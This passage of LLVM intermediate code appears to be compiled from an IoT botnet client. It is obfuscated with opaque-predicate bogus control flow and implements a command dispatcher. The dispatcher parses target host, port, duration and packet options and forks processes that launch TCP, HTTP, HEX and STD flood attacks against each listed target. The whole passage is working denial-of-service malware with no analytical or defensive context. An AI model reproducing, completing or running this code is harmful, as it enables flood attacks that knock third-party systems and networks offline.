  %380 = load i32, i32* @y.74
  %381 = sub i32 %379, 1
  %382 = mul i32 %379, %381
  %383 = urem i32 %382, 2
  %384 = icmp eq i32 %383, 0
  %385 = icmp slt i32 %380, 10
  %386 = or i1 %384, %385
  br i1 %386, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %387

; <label>:387:                                    ; preds = %originalBBpart244, %357
  br label %1471

; <label>:388:                                    ; preds = %originalBBpart2
  %389 = load i8**, i8*** %12, align 8
  %390 = getelementptr inbounds i8*, i8** %389, i64 0
  %391 = load i8*, i8** %390, align 8
  %392 = call i32 @strcmp(i8* %391, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.102, i32 0, i32 0)) #10
  %393 = icmp ne i32 %392, 0
  br i1 %393, label %595, label %394

; <label>:394:                                    ; preds = %388
  %395 = load i32, i32* %11, align 4
  %396 = icmp slt i32 %395, 6
  br i1 %396, label %471, label %397

; <label>:397:                                    ; preds = %394
  %398 = load i8**, i8*** %12, align 8
  %399 = getelementptr inbounds i8*, i8** %398, i64 3
  %400 = load i8*, i8** %399, align 8
  %401 = call i32 @atoi(i8* %400) #10
  %402 = icmp eq i32 %401, -1
  br i1 %402, label %471, label %403

; <label>:403:                                    ; preds = %397
  %404 = load i8**, i8*** %12, align 8
  %405 = getelementptr inbounds i8*, i8** %404, i64 2
  %406 = load i8*, i8** %405, align 8
  %407 = call i32 @atoi(i8* %406) #10
  %408 = icmp eq i32 %407, -1
  br i1 %408, label %471, label %409

; <label>:409:                                    ; preds = %403
  %410 = load i8**, i8*** %12, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 4
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @atoi(i8* %412) #10
  %414 = icmp eq i32 %413, -1
  br i1 %414, label %471, label %415

; <label>:415:                                    ; preds = %409
  %416 = load i32, i32* @x.73
  %417 = load i32, i32* @y.74
  %418 = sub i32 %416, 1
  %419 = mul i32 %416, %418
  %420 = urem i32 %419, 2
  %421 = icmp eq i32 %420, 0
  %422 = icmp slt i32 %417, 10
  %423 = or i1 %421, %422
  br i1 %423, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %415
  %424 = load i8**, i8*** %12, align 8
  %425 = getelementptr inbounds i8*, i8** %424, i64 4
  %426 = load i8*, i8** %425, align 8
  %427 = call i32 @atoi(i8* %426) #10
  %428 = icmp sgt i32 %427, 32
  %429 = load i32, i32* @x.73
  %430 = load i32, i32* @y.74
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %428, label %471, label %437

; <label>:437:                                    ; preds = %originalBBpart248
  %438 = load i32, i32* %11, align 4
  %439 = icmp sgt i32 %438, 6
  br i1 %439, label %440, label %446

; <label>:440:                                    ; preds = %437
  %441 = load i8**, i8*** %12, align 8
  %442 = getelementptr inbounds i8*, i8** %441, i64 6
  %443 = load i8*, i8** %442, align 8
  %444 = call i32 @atoi(i8* %443) #10
  %445 = icmp slt i32 %444, 0
  br i1 %445, label %471, label %446

; <label>:446:                                    ; preds = %440, %437
  %447 = load i32, i32* @x.73
  %448 = load i32, i32* @y.74
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %446
  %455 = load i32, i32* %11, align 4
  %456 = icmp eq i32 %455, 8
  %457 = load i32, i32* @x.73
  %458 = load i32, i32* @y.74
  %459 = sub i32 %457, 1
  %460 = mul i32 %457, %459
  %461 = urem i32 %460, 2
  %462 = icmp eq i32 %461, 0
  %463 = icmp slt i32 %458, 10
  %464 = or i1 %462, %463
  br i1 %464, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %456, label %465, label %472

; <label>:465:                                    ; preds = %originalBBpart252
  %466 = load i8**, i8*** %12, align 8
  %467 = getelementptr inbounds i8*, i8** %466, i64 7
  %468 = load i8*, i8** %467, align 8
  %469 = call i32 @atoi(i8* %468) #10
  %470 = icmp slt i32 %469, 1
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %465, %440, %originalBBpart248, %409, %403, %397, %394
  br label %1471

; <label>:472:                                    ; preds = %465, %originalBBpart252
  %473 = load i8**, i8*** %12, align 8
  %474 = getelementptr inbounds i8*, i8** %473, i64 1
  %475 = load i8*, i8** %474, align 8
  store i8* %475, i8** %22, align 8
  %476 = load i8**, i8*** %12, align 8
  %477 = getelementptr inbounds i8*, i8** %476, i64 2
  %478 = load i8*, i8** %477, align 8
  %479 = call i32 @atoi(i8* %478) #10
  store i32 %479, i32* %23, align 4
  %480 = load i8**, i8*** %12, align 8
  %481 = getelementptr inbounds i8*, i8** %480, i64 3
  %482 = load i8*, i8** %481, align 8
  %483 = call i32 @atoi(i8* %482) #10
  store i32 %483, i32* %24, align 4
  %484 = load i8**, i8*** %12, align 8
  %485 = getelementptr inbounds i8*, i8** %484, i64 4
  %486 = load i8*, i8** %485, align 8
  %487 = call i32 @atoi(i8* %486) #10
  store i32 %487, i32* %25, align 4
  %488 = load i8**, i8*** %12, align 8
  %489 = getelementptr inbounds i8*, i8** %488, i64 5
  %490 = load i8*, i8** %489, align 8
  store i8* %490, i8** %26, align 8
  %491 = load i32, i32* %11, align 4
  %492 = icmp eq i32 %491, 8
  br i1 %492, label %493, label %498

; <label>:493:                                    ; preds = %472
  %494 = load i8**, i8*** %12, align 8
  %495 = getelementptr inbounds i8*, i8** %494, i64 7
  %496 = load i8*, i8** %495, align 8
  %497 = call i32 @atoi(i8* %496) #10
  br label %499

; <label>:498:                                    ; preds = %472
  br label %499

; <label>:499:                                    ; preds = %498, %493
  %500 = phi i32 [ %497, %493 ], [ 10, %498 ]
  store i32 %500, i32* %27, align 4
  %501 = load i32, i32* %11, align 4
  %502 = icmp sgt i32 %501, 6
  br i1 %502, label %503, label %508

; <label>:503:                                    ; preds = %499
  %504 = load i8**, i8*** %12, align 8
  %505 = getelementptr inbounds i8*, i8** %504, i64 6
  %506 = load i8*, i8** %505, align 8
  %507 = call i32 @atoi(i8* %506) #10
  br label %525

; <label>:508:                                    ; preds = %499
  %509 = load i32, i32* @x.73
  %510 = load i32, i32* @y.74
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %508
  %517 = load i32, i32* @x.73
  %518 = load i32, i32* @y.74
  %519 = sub i32 %517, 1
  %520 = mul i32 %517, %519
  %521 = urem i32 %520, 2
  %522 = icmp eq i32 %521, 0
  %523 = icmp slt i32 %518, 10
  %524 = or i1 %522, %523
  br i1 %524, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %525

; <label>:525:                                    ; preds = %originalBBpart256, %503
  %526 = phi i32 [ %507, %503 ], [ 0, %originalBBpart256 ]
  %527 = load i32, i32* @x.73
  %528 = load i32, i32* @y.74
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %525
  store i32 %526, i32* %28, align 4
  %535 = load i8*, i8** %22, align 8
  %536 = call i8* @strstr(i8* %535, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %537 = icmp ne i8* %536, null
  %538 = load i32, i32* @x.73
  %539 = load i32, i32* @y.74
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %537, label %546, label %582

; <label>:546:                                    ; preds = %originalBBpart260
  %547 = load i8*, i8** %22, align 8
  %548 = call i8* @strtok(i8* %547, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %548, i8** %29, align 8
  br label %549

; <label>:549:                                    ; preds = %originalBBpart264, %546
  %550 = load i8*, i8** %29, align 8
  %551 = icmp ne i8* %550, null
  br i1 %551, label %552, label %581

; <label>:552:                                    ; preds = %549
  %553 = call i32 @listFork()
  %554 = icmp ne i32 %553, 0
  br i1 %554, label %563, label %555

; <label>:555:                                    ; preds = %552
  %556 = load i8*, i8** %29, align 8
  %557 = load i32, i32* %23, align 4
  %558 = load i32, i32* %24, align 4
  %559 = load i32, i32* %25, align 4
  %560 = load i8*, i8** %26, align 8
  %561 = load i32, i32* %28, align 4
  %562 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %556, i32 %557, i32 %558, i32 %559, i8* %560, i32 %561, i32 %562)
  call void @_exit(i32 0) #12
  unreachable

; <label>:563:                                    ; preds = %552
  %564 = load i32, i32* @x.73
  %565 = load i32, i32* @y.74
  %566 = sub i32 %564, 1
  %567 = mul i32 %564, %566
  %568 = urem i32 %567, 2
  %569 = icmp eq i32 %568, 0
  %570 = icmp slt i32 %565, 10
  %571 = or i1 %569, %570
  br i1 %571, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %563
  %572 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %572, i8** %29, align 8
  %573 = load i32, i32* @x.73
  %574 = load i32, i32* @y.74
  %575 = sub i32 %573, 1
  %576 = mul i32 %573, %575
  %577 = urem i32 %576, 2
  %578 = icmp eq i32 %577, 0
  %579 = icmp slt i32 %574, 10
  %580 = or i1 %578, %579
  br i1 %580, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %549

; <label>:581:                                    ; preds = %549
  br label %594

; <label>:582:                                    ; preds = %originalBBpart260
  %583 = call i32 @listFork()
  %584 = icmp ne i32 %583, 0
  br i1 %584, label %593, label %585

; <label>:585:                                    ; preds = %582
  %586 = load i8*, i8** %22, align 8
  %587 = load i32, i32* %23, align 4
  %588 = load i32, i32* %24, align 4
  %589 = load i32, i32* %25, align 4
  %590 = load i8*, i8** %26, align 8
  %591 = load i32, i32* %28, align 4
  %592 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %586, i32 %587, i32 %588, i32 %589, i8* %590, i32 %591, i32 %592)
  call void @_exit(i32 0) #12
  unreachable

; <label>:593:                                    ; preds = %582
  br label %594

; <label>:594:                                    ; preds = %593, %581
  br label %1471

; <label>:595:                                    ; preds = %388
  %596 = load i8**, i8*** %12, align 8
  %597 = getelementptr inbounds i8*, i8** %596, i64 0
  %598 = load i8*, i8** %597, align 8
  %599 = call i32 @strcmp(i8* %598, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.103, i32 0, i32 0)) #10
  %600 = icmp ne i32 %599, 0
  br i1 %600, label %681, label %601

; <label>:601:                                    ; preds = %595
  %602 = load i32, i32* @x.73
  %603 = load i32, i32* @y.74
  %604 = sub i32 %602, 1
  %605 = mul i32 %602, %604
  %606 = urem i32 %605, 2
  %607 = icmp eq i32 %606, 0
  %608 = icmp slt i32 %603, 10
  %609 = or i1 %607, %608
  br i1 %609, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %601
  %610 = load i32, i32* %11, align 4
  %611 = icmp slt i32 %610, 4
  %612 = load i32, i32* @x.73
  %613 = load i32, i32* @y.74
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %611, label %632, label %620

; <label>:620:                                    ; preds = %originalBBpart268
  %621 = load i8**, i8*** %12, align 8
  %622 = getelementptr inbounds i8*, i8** %621, i64 2
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 @atoi(i8* %623) #10
  %625 = icmp slt i32 %624, 1
  br i1 %625, label %632, label %626

; <label>:626:                                    ; preds = %620
  %627 = load i8**, i8*** %12, align 8
  %628 = getelementptr inbounds i8*, i8** %627, i64 3
  %629 = load i8*, i8** %628, align 8
  %630 = call i32 @atoi(i8* %629) #10
  %631 = icmp slt i32 %630, 1
  br i1 %631, label %632, label %633

; <label>:632:                                    ; preds = %626, %620, %originalBBpart268
  br label %1471

; <label>:633:                                    ; preds = %626
  %634 = load i8**, i8*** %12, align 8
  %635 = getelementptr inbounds i8*, i8** %634, i64 1
  %636 = load i8*, i8** %635, align 8
  store i8* %636, i8** %30, align 8
  %637 = load i8**, i8*** %12, align 8
  %638 = getelementptr inbounds i8*, i8** %637, i64 2
  %639 = load i8*, i8** %638, align 8
  %640 = call i32 @atoi(i8* %639) #10
  store i32 %640, i32* %31, align 4
  %641 = load i8**, i8*** %12, align 8
  %642 = getelementptr inbounds i8*, i8** %641, i64 3
  %643 = load i8*, i8** %642, align 8
  %644 = call i32 @atoi(i8* %643) #10
  store i32 %644, i32* %32, align 4
  %645 = load i8*, i8** %30, align 8
  %646 = call i8* @strstr(i8* %645, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %647 = icmp ne i8* %646, null
  br i1 %647, label %648, label %660

; <label>:648:                                    ; preds = %633
  %649 = load i8*, i8** %30, align 8
  %650 = call i8* @strtok(i8* %649, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %650, i8** %33, align 8
  br label %651

; <label>:651:                                    ; preds = %654, %648
  %652 = load i8*, i8** %33, align 8
  %653 = icmp ne i8* %652, null
  br i1 %653, label %654, label %659

; <label>:654:                                    ; preds = %651
  %655 = load i8*, i8** %33, align 8
  %656 = load i32, i32* %31, align 4
  %657 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %655, i32 %656, i32 %657)
  %658 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %658, i8** %33, align 8
  br label %651

; <label>:659:                                    ; preds = %651
  br label %664

; <label>:660:                                    ; preds = %633
  %661 = load i8*, i8** %30, align 8
  %662 = load i32, i32* %31, align 4
  %663 = load i32, i32* %32, align 4
  call void @sendHTTP(i8* %661, i32 %662, i32 %663)
  br label %664

; <label>:664:                                    ; preds = %660, %659
  %665 = load i32, i32* @x.73
  %666 = load i32, i32* @y.74
  %667 = sub i32 %665, 1
  %668 = mul i32 %665, %667
  %669 = urem i32 %668, 2
  %670 = icmp eq i32 %669, 0
  %671 = icmp slt i32 %666, 10
  %672 = or i1 %670, %671
  br i1 %672, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %664
  %673 = load i32, i32* @x.73
  %674 = load i32, i32* @y.74
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br label %1471

; <label>:681:                                    ; preds = %595
  %682 = load i8**, i8*** %12, align 8
  %683 = getelementptr inbounds i8*, i8** %682, i64 0
  %684 = load i8*, i8** %683, align 8
  %685 = call i32 @strcmp(i8* %684, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.104, i32 0, i32 0)) #10
  %686 = icmp ne i32 %685, 0
  br i1 %686, label %794, label %687

; <label>:687:                                    ; preds = %681
  %688 = load i32, i32* @x.73
  %689 = load i32, i32* @y.74
  %690 = sub i32 %688, 1
  %691 = mul i32 %688, %690
  %692 = urem i32 %691, 2
  %693 = icmp eq i32 %692, 0
  %694 = icmp slt i32 %689, 10
  %695 = or i1 %693, %694
  br i1 %695, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %687
  %696 = load i32, i32* %11, align 4
  %697 = icmp slt i32 %696, 6
  %698 = load i32, i32* @x.73
  %699 = load i32, i32* @y.74
  %700 = sub i32 %698, 1
  %701 = mul i32 %698, %700
  %702 = urem i32 %701, 2
  %703 = icmp eq i32 %702, 0
  %704 = icmp slt i32 %699, 10
  %705 = or i1 %703, %704
  br i1 %705, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %697, label %750, label %706

; <label>:706:                                    ; preds = %originalBBpart276
  %707 = load i32, i32* @x.73
  %708 = load i32, i32* @y.74
  %709 = sub i32 %707, 1
  %710 = mul i32 %707, %709
  %711 = urem i32 %710, 2
  %712 = icmp eq i32 %711, 0
  %713 = icmp slt i32 %708, 10
  %714 = or i1 %712, %713
  br i1 %714, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %706
  %715 = load i8**, i8*** %12, align 8
  %716 = getelementptr inbounds i8*, i8** %715, i64 3
  %717 = load i8*, i8** %716, align 8
  %718 = call i32 @atoi(i8* %717) #10
  %719 = icmp slt i32 %718, 1
  %720 = load i32, i32* @x.73
  %721 = load i32, i32* @y.74
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %719, label %750, label %728

; <label>:728:                                    ; preds = %originalBBpart280
  %729 = load i32, i32* @x.73
  %730 = load i32, i32* @y.74
  %731 = sub i32 %729, 1
  %732 = mul i32 %729, %731
  %733 = urem i32 %732, 2
  %734 = icmp eq i32 %733, 0
  %735 = icmp slt i32 %730, 10
  %736 = or i1 %734, %735
  br i1 %736, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %728
  %737 = load i8**, i8*** %12, align 8
  %738 = getelementptr inbounds i8*, i8** %737, i64 5
  %739 = load i8*, i8** %738, align 8
  %740 = call i32 @atoi(i8* %739) #10
  %741 = icmp slt i32 %740, 1
  %742 = load i32, i32* @x.73
  %743 = load i32, i32* @y.74
  %744 = sub i32 %742, 1
  %745 = mul i32 %742, %744
  %746 = urem i32 %745, 2
  %747 = icmp eq i32 %746, 0
  %748 = icmp slt i32 %743, 10
  %749 = or i1 %747, %748
  br i1 %749, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %741, label %750, label %751

; <label>:750:                                    ; preds = %originalBBpart284, %originalBBpart280, %originalBBpart276
  br label %1471

; <label>:751:                                    ; preds = %originalBBpart284
  %752 = call i32 @listFork()
  %753 = icmp ne i32 %752, 0
  br i1 %753, label %754, label %771

; <label>:754:                                    ; preds = %751
  %755 = load i32, i32* @x.73
  %756 = load i32, i32* @y.74
  %757 = sub i32 %755, 1
  %758 = mul i32 %755, %757
  %759 = urem i32 %758, 2
  %760 = icmp eq i32 %759, 0
  %761 = icmp slt i32 %756, 10
  %762 = or i1 %760, %761
  br i1 %762, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %754
  %763 = load i32, i32* @x.73
  %764 = load i32, i32* @y.74
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br label %1471

; <label>:771:                                    ; preds = %751
  %772 = load i8**, i8*** %12, align 8
  %773 = getelementptr inbounds i8*, i8** %772, i64 1
  %774 = load i8*, i8** %773, align 8
  %775 = load i8**, i8*** %12, align 8
  %776 = getelementptr inbounds i8*, i8** %775, i64 2
  %777 = load i8*, i8** %776, align 8
  %778 = load i8**, i8*** %12, align 8
  %779 = getelementptr inbounds i8*, i8** %778, i64 3
  %780 = load i8*, i8** %779, align 8
  %781 = call i32 @atoi(i8* %780) #10
  %782 = trunc i32 %781 to i16
  %783 = load i8**, i8*** %12, align 8
  %784 = getelementptr inbounds i8*, i8** %783, i64 4
  %785 = load i8*, i8** %784, align 8
  %786 = load i8**, i8*** %12, align 8
  %787 = getelementptr inbounds i8*, i8** %786, i64 5
  %788 = load i8*, i8** %787, align 8
  %789 = call i32 @atoi(i8* %788) #10
  %790 = load i8**, i8*** %12, align 8
  %791 = getelementptr inbounds i8*, i8** %790, i64 6
  %792 = load i8*, i8** %791, align 8
  %793 = call i32 @atoi(i8* %792) #10
  call void @sendHEX(i8* %774, i8* %777, i16 zeroext %782, i8* %785, i32 %789, i32 %793)
  call void @exit(i32 0) #14
  unreachable

; <label>:794:                                    ; preds = %681
  %795 = load i8**, i8*** %12, align 8
  %796 = getelementptr inbounds i8*, i8** %795, i64 0
  %797 = load i8*, i8** %796, align 8
  %798 = call i32 @strcmp(i8* %797, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i32 0, i32 0)) #10
  %799 = icmp ne i32 %798, 0
  br i1 %799, label %912, label %800

; <label>:800:                                    ; preds = %794
  %801 = load i32, i32* @x.73
  %802 = load i32, i32* @y.74
  %803 = sub i32 %801, 1
  %804 = mul i32 %801, %803
  %805 = urem i32 %804, 2
  %806 = icmp eq i32 %805, 0
  %807 = icmp slt i32 %802, 10
  %808 = or i1 %806, %807
  br i1 %808, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %800
  %809 = load i32, i32* %11, align 4
  %810 = icmp slt i32 %809, 4
  %811 = load i32, i32* @x.73
  %812 = load i32, i32* @y.74
  %813 = sub i32 %811, 1
  %814 = mul i32 %811, %813
  %815 = urem i32 %814, 2
  %816 = icmp eq i32 %815, 0
  %817 = icmp slt i32 %812, 10
  %818 = or i1 %816, %817
  br i1 %818, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %810, label %847, label %819

; <label>:819:                                    ; preds = %originalBBpart292
  %820 = load i32, i32* @x.73
  %821 = load i32, i32* @y.74
  %822 = sub i32 %820, 1
  %823 = mul i32 %820, %822
  %824 = urem i32 %823, 2
  %825 = icmp eq i32 %824, 0
  %826 = icmp slt i32 %821, 10
  %827 = or i1 %825, %826
  br i1 %827, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %819
  %828 = load i8**, i8*** %12, align 8
  %829 = getelementptr inbounds i8*, i8** %828, i64 2
  %830 = load i8*, i8** %829, align 8
  %831 = call i32 @atoi(i8* %830) #10
  %832 = icmp slt i32 %831, 1
  %833 = load i32, i32* @x.73
  %834 = load i32, i32* @y.74
  %835 = sub i32 %833, 1
  %836 = mul i32 %833, %835
  %837 = urem i32 %836, 2
  %838 = icmp eq i32 %837, 0
  %839 = icmp slt i32 %834, 10
  %840 = or i1 %838, %839
  br i1 %840, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %832, label %847, label %841

; <label>:841:                                    ; preds = %originalBBpart296
  %842 = load i8**, i8*** %12, align 8
  %843 = getelementptr inbounds i8*, i8** %842, i64 3
  %844 = load i8*, i8** %843, align 8
  %845 = call i32 @atoi(i8* %844) #10
  %846 = icmp slt i32 %845, 1
  br i1 %846, label %847, label %848

; <label>:847:                                    ; preds = %841, %originalBBpart296, %originalBBpart292
  br label %1471

; <label>:848:                                    ; preds = %841
  %849 = load i8**, i8*** %12, align 8
  %850 = getelementptr inbounds i8*, i8** %849, i64 1
  %851 = load i8*, i8** %850, align 8
  store i8* %851, i8** %34, align 8
  %852 = load i8**, i8*** %12, align 8
  %853 = getelementptr inbounds i8*, i8** %852, i64 2
  %854 = load i8*, i8** %853, align 8
  %855 = call i32 @atoi(i8* %854) #10
  store i32 %855, i32* %35, align 4
  %856 = load i8**, i8*** %12, align 8
  %857 = getelementptr inbounds i8*, i8** %856, i64 3
  %858 = load i8*, i8** %857, align 8
  %859 = call i32 @atoi(i8* %858) #10
  store i32 %859, i32* %36, align 4
  %860 = load i8*, i8** %34, align 8
  %861 = call i8* @strstr(i8* %860, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #10
  %862 = icmp ne i8* %861, null
  br i1 %862, label %863, label %891

; <label>:863:                                    ; preds = %848
  %864 = load i32, i32* @x.73
  %865 = load i32, i32* @y.74
  %866 = sub i32 %864, 1
  %867 = mul i32 %864, %866
  %868 = urem i32 %867, 2
  %869 = icmp eq i32 %868, 0
  %870 = icmp slt i32 %865, 10
  %871 = or i1 %869, %870
  br i1 %871, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %863
  %872 = load i8*, i8** %34, align 8
  %873 = call i8* @strtok(i8* %872, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %873, i8** %37, align 8
  %874 = load i32, i32* @x.73
  %875 = load i32, i32* @y.74
  %876 = sub i32 %874, 1
  %877 = mul i32 %874, %876
  %878 = urem i32 %877, 2
  %879 = icmp eq i32 %878, 0
  %880 = icmp slt i32 %875, 10
  %881 = or i1 %879, %880
  br i1 %881, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br label %882

; <label>:882:                                    ; preds = %885, %originalBBpart2100
  %883 = load i8*, i8** %37, align 8
  %884 = icmp ne i8* %883, null
  br i1 %884, label %885, label %890

; <label>:885:                                    ; preds = %882
  %886 = load i8*, i8** %37, align 8
  %887 = load i32, i32* %35, align 4
  %888 = load i32, i32* %36, align 4
  call void @sendSTD(i8* %886, i32 %887, i32 %888)
  %889 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0)) #2
  store i8* %889, i8** %37, align 8
  br label %882

; <label>:890:                                    ; preds = %882
  br label %911

; <label>:891:                                    ; preds = %848
  %892 = load i32, i32* @x.73
  %893 = load i32, i32* @y.74
  %894 = sub i32 %892, 1
  %895 = mul i32 %892, %894
  %896 = urem i32 %895, 2
  %897 = icmp eq i32 %896, 0
  %898 = icmp slt i32 %893, 10
  %899 = or i1 %897, %898
  br i1 %899, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %891
  %900 = load i8*, i8** %34, align 8
  %901 = load i32, i32* %35, align 4
  %902 = load i32, i32* %36, align 4
  call void @sendSTD(i8* %900, i32 %901, i32 %902)
  %903 = load i32, i32* @x.73
  %904 = load i32, i32* @y.74
  %905 = sub i32 %903, 1
  %906 = mul i32 %903, %905
  %907 = urem i32 %906, 2
  %908 = icmp eq i32 %907, 0
  %909 = icmp slt i32 %904, 10
  %910 = or i1 %908, %909
  br i1 %910, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %911

; <label>:911:                                    ; preds = %originalBBpart2104, %890
  br label %1471

; <label>:912:                                    ; preds = %794
  %913 = load i32, i32* @x.73
  %914 = load i32, i32* @y.74
  %915 = sub i32 %913, 1
  %916 = mul i32 %913, %915
  %917 = urem i32 %916, 2
  %918 = icmp eq i32 %917, 0
  %919 = icmp slt i32 %914, 10
  %920 = or i1 %918, %919
  br i1 %920, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %912
  %921 = load i8**, i8*** %12, align 8
  %922 = getelementptr inbounds i8*, i8** %921, i64 0
  %923 = load i8*, i8** %922, align 8
  %924 = call i32 @strcmp(i8* %923, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.106, i32 0, i32 0)) #10
  %925 = icmp ne i32 %924, 0
  %926 = load i32, i32* @x.73
  %927 = load i32, i32* @y.74
  %928 = sub i32 %926, 1
  %929 = mul i32 %926, %928
  %930 = urem i32 %929, 2
  %931 = icmp eq i32 %930, 0
  %932 = icmp slt i32 %927, 10
  %933 = or i1 %931, %932
  br i1 %933, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %925, label %1088, label %934

; <label>:934:                                    ; preds = %originalBBpart2108
  %935 = load i32, i32* @x.73
  %936 = load i32, i32* @y.74
  %937 = sub i32 %935, 1
  %938 = mul i32 %935, %937
  %939 = urem i32 %938, 2
  %940 = icmp eq i32 %939, 0
  %941 = icmp slt i32 %936, 10
  %942 = or i1 %940, %941
  br i1 %942, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %934
  %943 = load i32, i32* %11, align 4
  %944 = icmp slt i32 %943, 6
  %945 = load i32, i32* @x.73
  %946 = load i32, i32* @y.74
  %947 = sub i32 %945, 1
  %948 = mul i32 %945, %947
  %949 = urem i32 %948, 2
  %950 = icmp eq i32 %949, 0
